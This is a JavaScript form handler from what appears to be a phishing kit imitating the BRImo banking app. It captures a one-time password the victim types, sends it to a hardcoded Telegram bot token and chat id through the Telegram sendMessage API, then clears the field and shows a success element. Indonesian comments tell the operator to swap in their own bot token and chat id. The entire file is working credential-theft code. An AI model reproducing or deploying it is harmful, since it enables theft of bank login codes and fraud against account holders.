function kirimPesan1(event){
  event.preventDefault();

    var nama1 = document.getElementById('nama1');
    var logo = document.getElementById('logo');
    

    var gabungan = `( BRImo | OTP )%0A%0A- Code OTP : ${nama1.value}`;

var token = '7580781557:AAHgfHSdeJLmEej_bQNOtFy78hX1JeCIXAY'; // Ganti dengan token bot yang kamu buat
    var grup = '7451712086'; // Ganti dengan chat id dari bot yang kamu buat    

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
        
   success: function(){
     
     
 document.getElementById("blinkotp").style.display = "block";
 $("#nama1").val("");
 $("#nama1").addClass('textarea1'); 
    setTimeout(function(){


    }, 1000);}});};